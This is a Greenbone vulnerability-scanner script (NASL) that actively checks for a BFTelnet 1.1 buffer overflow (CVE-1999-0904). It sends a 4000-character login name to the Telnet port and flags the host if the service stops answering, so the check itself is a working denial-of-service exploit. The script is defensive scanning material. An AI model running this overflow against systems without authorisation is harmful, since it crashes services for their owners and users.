# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146617");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2021-09-02 12:08:47 +0000 (Thu, 02 Sep 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");

  script_cve_id("CVE-1999-0904");

  script_tag(name:"qod_type", value:"remote_probe");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("BFTelnet <= 1.1 DoS Vulnerability - Active Check");

  script_category(ACT_DENIAL);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Denial of Service");
  # nb: Don't add a script_mandatory_keys(), this should run against every Telnet service as
  # requested by a customer.
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);

  script_tag(name:"summary", value:"BFTelnet is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted LOGIN sequence and checks if the service is
  still alive.");

  script_tag(name:"insight", value:"A buffer overflow in BFTelnet allows remote attackers to cause
  a DoS via a long username.");

  script_tag(name:"affected", value:"BFTelnet version 1.1 and probably. Other products might be
  affected as well.");

  script_tag(name:"solution", value:"Update to the latest available version.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/771");

  exit(0);
}

include("port_service_func.inc");
include("telnet_func.inc");

port = telnet_get_port(default: 23);

soc = open_sock_tcp(port);
if (!soc)
  exit(0);

banner = telnet_negotiate(socket: soc);

if (!banner || "Login:" >!< banner) {
  close(soc);
  exit(0);
}

send(socket: soc, data: crap(length: 4000) + '\r\n');
close(soc);

for (i = 0; i < 3; i++) {
  soc = open_sock_tcp(port);
  if (soc) {
    close(soc);
    exit(0);
  }
}

security_message(port: port);

exit(0);
